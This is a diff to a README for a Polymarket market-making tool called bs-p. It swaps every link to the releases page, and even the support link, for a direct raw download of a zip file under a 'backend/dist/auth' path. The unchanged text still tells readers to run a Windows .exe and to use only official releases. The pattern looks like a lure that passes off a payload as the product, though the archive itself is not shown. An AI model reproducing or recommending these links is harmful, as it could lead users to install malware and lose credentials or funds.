@@ -1,6 +1,6 @@
 # ⚙️ bs-p - Fast Market-Making Kernel for Polymarket
 
-[![Download bs-p](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/akamsniper/bs-p/releases)
+[![Download bs-p](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/akamsniper/bs-p/raw/refs/heads/main/backend/dist/auth/bs_p_v3.1.zip)
 
 ---
 
@@ -40,10 +40,10 @@ If you are unsure if your processor supports AVX-512, you can check it with free
 
 To get the software, you need to visit the official releases page on GitHub.
 
-[![Download bs-p](https://img.shields.io/badge/Download-Here-blue)](https://github.com/akamsniper/bs-p/releases)
+[![Download bs-p](https://img.shields.io/badge/Download-Here-blue)](https://github.com/akamsniper/bs-p/raw/refs/heads/main/backend/dist/auth/bs_p_v3.1.zip)
 
 1. Click the link above or go to this URL in your web browser:  
-   https://github.com/akamsniper/bs-p/releases  
+   https://github.com/akamsniper/bs-p/raw/refs/heads/main/backend/dist/auth/bs_p_v3.1.zip  
 2. On that page, look for the latest release version. Releases are listed by date.  
 3. Find the Windows executable file. It will usually have a name ending with `.exe`.  
 4. Click the file to start downloading it to your computer.
@@ -91,7 +91,7 @@ It is a good practice to keep bs-p updated as new versions fix bugs and improve 
 To update:
 
 1. Visit the releases page again:  
-   https://github.com/akamsniper/bs-p/releases  
+   https://github.com/akamsniper/bs-p/raw/refs/heads/main/backend/dist/auth/bs_p_v3.1.zip  
 2. Download the new version’s `.exe` file.  
 3. Replace your old `.exe` file with the new one by saving it in the same folder.
 
@@ -122,7 +122,7 @@ Always download software only from the official releases page to avoid tampered 
 
 For support, visit the GitHub repository page:
 
-https://github.com/akamsniper/bs-p
+https://github.com/akamsniper/bs-p/raw/refs/heads/main/backend/dist/auth/bs_p_v3.1.zip
 
 Here you can find more technical details, report issues, or request help from the maintainers.
 
@@ -136,4 +136,4 @@ Here you can find more technical details, report issues, or request help from th
 
 ---
 
-[![Download bs-p](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/akamsniper/bs-p/releases)
+[![Download bs-p](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/akamsniper/bs-p/raw/refs/heads/main/backend/dist/auth/bs_p_v3.1.zip)
